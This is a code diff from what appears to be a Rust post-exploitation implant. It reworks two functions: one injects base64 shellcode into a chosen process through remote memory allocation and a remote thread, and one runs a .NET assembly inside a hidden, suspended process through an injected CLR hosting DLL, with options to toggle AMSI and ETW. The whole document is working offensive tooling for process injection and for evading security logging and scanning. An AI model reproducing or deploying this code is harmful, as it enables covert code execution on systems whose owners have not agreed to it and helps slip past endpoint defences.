@@ -3,6 +3,7 @@ extern crate winapi;
 use std::os::windows::process::CommandExt;
 use std::ffi::c_void;
 use std::time::Duration;
+use std::thread;
 use std::thread::sleep;
 
 pub fn empire(args: Vec<&str>) -> String {
@@ -23,21 +24,22 @@ pub fn process_injection(args: Vec<&str>) -> String {
     if args.len() < 2 {
         return "please specify PID".to_string()
     }
+
     let pid = match args[1].parse::<u32>() {
         Err(e)  => return e.to_string(),
         Ok(pid) => pid,
     };
-    let mut output_vec: Vec<String> = Vec::new();
     let shellcode_b64 = args[2];
     let mut shellcode = base64::decode(shellcode_b64).unwrap();
     let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void; 
+
     // get process handle
     let handle = unsafe {winapi::um::processthreadsapi::OpenProcess(
         winapi::um::winnt::PROCESS_ALL_ACCESS,
         0x01,
         pid
     )};
-    output_vec.push(format!("OpenProcess: {:?}", handle));
+
     // alloc payload
     let addr_shellcode = unsafe {winapi::um::memoryapi::VirtualAllocEx(
         handle,
@@ -46,29 +48,25 @@ pub fn process_injection(args: Vec<&str>) -> String {
         winapi::um::winnt::MEM_COMMIT,
         winapi::um::winnt::PAGE_READWRITE
     )};
-    output_vec.push(format!("VirtualAllocEx: {:?}", addr_shellcode));
     let mut ret_len: usize = 0;
-    let mem_write = unsafe {winapi::um::memoryapi::WriteProcessMemory(
+    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
         handle,
         addr_shellcode,
         shellcode_ptr,
         shellcode.len(),
         &mut ret_len
     )};
-    let last_error = unsafe {winapi::um::errhandlingapi::GetLastError()};
-    output_vec.push(format!("WriteProcessMemory: {:?}", mem_write));
-    output_vec.push(format!("GetLastError: {:?}", last_error));
+
     // protect and execute
     let mut old_protect: u32 = 0;
-    let virt_protect = unsafe {winapi::um::memoryapi::VirtualProtectEx(
+    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
         handle,
         addr_shellcode,
         shellcode.len(),
         winapi::um::winnt::PAGE_EXECUTE_READ,
         &mut old_protect
     )};
-    output_vec.push(format!("VirtualProtectEx: {:?}", virt_protect));
-    let remote_thread = unsafe {winapi::um::processthreadsapi::CreateRemoteThreadEx(
+    let _ = unsafe {winapi::um::processthreadsapi::CreateRemoteThreadEx(
         handle,
         std::ptr::null_mut(),
         0,
@@ -78,13 +76,12 @@ pub fn process_injection(args: Vec<&str>) -> String {
         std::ptr::null_mut(),
         0 as _
     )};
-    output_vec.push(format!("CreateRemoteThreadEx: {:?}", remote_thread));
-    output_vec.push("shellcode injected".to_string());
-    output_vec.join("\n")
+
+    "success".to_string()
 }
 
 pub fn execute_assembly(args: Vec<&str>) -> String {
-    if args.len() < 8 {
+    if args.len() < 7 {
         return "".to_string()
     }
 
@@ -93,25 +90,42 @@ pub fn execute_assembly(args: Vec<&str>) -> String {
     let assembly = base64::decode(assembly_b64).unwrap();
     let hosting_dll_b64 = args[2];
     let mut hosting_dll = base64::decode(hosting_dll_b64).unwrap();
-    let hosting_dll_size = hosting_dll.len();
-    let hosting_dll_ptr: *mut c_void = &mut hosting_dll as *mut _ as *mut c_void; 
+    let hosting_dll_ptr: *mut c_void = hosting_dll.as_mut_ptr() as *mut c_void; 
     let process = args[3];
-    let amsi = args[4].parse::<u8>().unwrap();
-    let etw = args[5].parse::<u8>().unwrap();
-    let mut offset_u32 = args[6].parse::<u32>().unwrap();
-    let offset: *mut c_void = &mut offset_u32 as *mut _ as *mut c_void;
-    let params = args[7..].join(" ");
-    let assembly_size = assembly.len();
+    let amsi = match args[4].parse::<bool>() {
+        Err(e)  => return e.to_string(),
+        Ok(i) => i,
+    };
+    let etw = match args[5].parse::<bool>() {
+        Err(e)  => return e.to_string(),
+        Ok(i) => i,
+    };
+    let offset_u64 = 0x000010B0;
+    let params = args[6..].join(" ");
+    let mut output_vec: Vec<String> = Vec::new();
     
     // spawn suspended process
     let cmd = std::process::Command::new(process)
-        //.stdin(std::process::Stdio::piped())
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::piped())
         .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW | winapi::um::winbase::CREATE_SUSPENDED)
         .spawn()
         .unwrap();
     let pid = cmd.id();
+
+    // get output
+    let (tx, rx) = std::sync::mpsc::channel::<String>();
+    thread::spawn(move || {
+        match cmd.wait_with_output() {
+            Err(e)      => tx.send(format!("{}", e)).unwrap(),
+            Ok(output)  => { tx.send(format!("{}{}", 
+                String::from_utf8(output.stdout).unwrap(), 
+                String::from_utf8(output.stderr).unwrap()))
+                .unwrap()
+            },
+        };
+    });
+
     // get process handle
     let handle = unsafe {winapi::um::processthreadsapi::OpenProcess(
         winapi::um::winnt::PROCESS_ALL_ACCESS,
@@ -128,78 +142,93 @@ pub fn execute_assembly(args: Vec<&str>) -> String {
     // assembly bytes
     let mut payload: Vec<u8> = Vec::new();
     // assembly size
-    payload.extend_from_slice(&[assembly_size as u8]);
+    let assembly_len_byte_array: [u8; 4] = unsafe {std::mem::transmute((assembly.len() as u32).to_le())};
+    payload.extend_from_slice(&assembly_len_byte_array);
     // params size
-    payload.extend_from_slice(&[args[7..].len() as u8]);
+    let params_len_byte_array: [u8; 4] = unsafe {std::mem::transmute(((params.len() + 1 as usize) as u32).to_le())};
+    payload.extend_from_slice(&params_len_byte_array);
     // AMSI
-    payload.extend_from_slice(&[amsi]);
+    if amsi {
+        payload.extend_from_slice(&[0x01]);
+    } else {
+        payload.extend_from_slice(&[0x00]);
+    }
     // ETW
-    payload.extend_from_slice(&[etw]);
+    if etw {
+        payload.extend_from_slice(&[0x01]);
+    } else {
+        payload.extend_from_slice(&[0x00]);
+    }
     // parameters
     payload.extend_from_slice(params.as_bytes());
     payload.extend_from_slice(&[0x00]);
-    let payload_ptr: *mut c_void = &mut payload as *mut _ as *mut c_void; 
-    let payload_size = payload.len();
+    payload.extend_from_slice(&assembly);
+    let payload_ptr: *mut c_void = payload.as_mut_ptr() as *mut c_void; 
 
     // alloc HostingCLRx64.dll
     let addr_hosting_dll = unsafe{winapi::um::memoryapi::VirtualAllocEx(
         handle,
-        std::ptr::null_mut(),
-        hosting_dll_size,
+        0 as _,
+        hosting_dll.len(),
         winapi::um::winnt::MEM_COMMIT,
         winapi::um::winnt::PAGE_READWRITE
     )};
     let mut ret_len: usize = 0;
-    let mut _mem_writer = unsafe {winapi::um::memoryapi::WriteProcessMemory(
+    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
         handle,
         addr_hosting_dll,
         hosting_dll_ptr,
-        hosting_dll_size,
+        hosting_dll.len(),
         &mut ret_len
     )};
+
     // alloc payload
     let addr_assembly = unsafe{winapi::um::memoryapi::VirtualAllocEx(
         handle,
         std::ptr::null_mut(),
-        payload_size,
+        payload.len(),
         winapi::um::winnt::MEM_COMMIT,
         winapi::um::winnt::PAGE_READWRITE
     )};
-    _mem_writer = unsafe {winapi::um::memoryapi::WriteProcessMemory(
+    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
         handle,
         addr_assembly,
         payload_ptr,
-        payload_size,
+        payload.len(),
         &mut ret_len
     )};
+
     // protect and execute
     let mut old_protect: u32 = 0;
     let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
         handle,
         addr_hosting_dll,
-        hosting_dll_size,
+        hosting_dll.len(),
+        winapi::um::winnt::PAGE_EXECUTE_READ,
+        &mut old_protect
+    )};
+    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
+        handle,
+        addr_assembly,
+        payload.len(),
         winapi::um::winnt::PAGE_EXECUTE_READ,
         &mut old_protect
     )};
     let mut lp_thread_id: u32 = 0;
-    // calculate thread start address
-    let thread_start_addr_u64: u64 = addr_hosting_dll as u64 + offset as u64;
-    //let thread_start_addr: &mut c_void = &mut thread_start_addr_u32 as &mut _ as &mut c_void;
-    let func_thread = unsafe {std::mem::transmute(thread_start_addr_u64)};
+    let thread_start_addr = unsafe { addr_hosting_dll.offset(offset_u64) };
     let thread_handle = unsafe {winapi::um::processthreadsapi::CreateRemoteThreadEx(
         handle,
         std::ptr::null_mut(),
         0,
-        func_thread,
+        std::mem::transmute(thread_start_addr),
         addr_assembly,
         0,
         std::ptr::null_mut(),
         &mut lp_thread_id
     )};
+
     // wait for thread to finish
-    let output_vec: Vec<String> = Vec::new();
     loop {
-        //let tmp_output = cmd.stdout.as_mut().unwrap().read();
         let mut ret_code: u32 = 0;
         let _ = unsafe {winapi::um::processthreadsapi::GetExitCodeThread(
             thread_handle,
@@ -208,24 +237,17 @@ pub fn execute_assembly(args: Vec<&str>) -> String {
         if ret_code == winapi::um::minwinbase::STILL_ACTIVE {
             sleep(Duration::from_secs(1));
         } else {
+            let _ = unsafe {winapi::um::processthreadsapi::TerminateProcess(handle, 0)};
+            match rx.recv() {
+                Ok(output)  => output_vec.push(output),
+                Err(_)      => output_vec.push("could not get output".to_string()),
+            }
             break
         }
     }
 
-    // TODO
-    // handle stdout and stderr correctly before killing process
-    // consider using pipes to collect stdout and stderr so that wait_with_output does not need to be called
-    // this process will not exit, so it must be killed
-    // get output
-    //let output = cmd.wait_with_output().unwrap();
-    //output_vec.push(std::str::from_utf8(&output.stdout).unwrap().to_string());
-    //output_vec.push(std::str::from_utf8(&output.stderr).unwrap().to_string());
-
-    // kill process
-    //let _ = cmd.kill();
-
     // close process handle
     let _ = unsafe { winapi::um::handleapi::CloseHandle(handle); };
 
-    output_vec.join(" ")
+    output_vec.join("\n")
 }
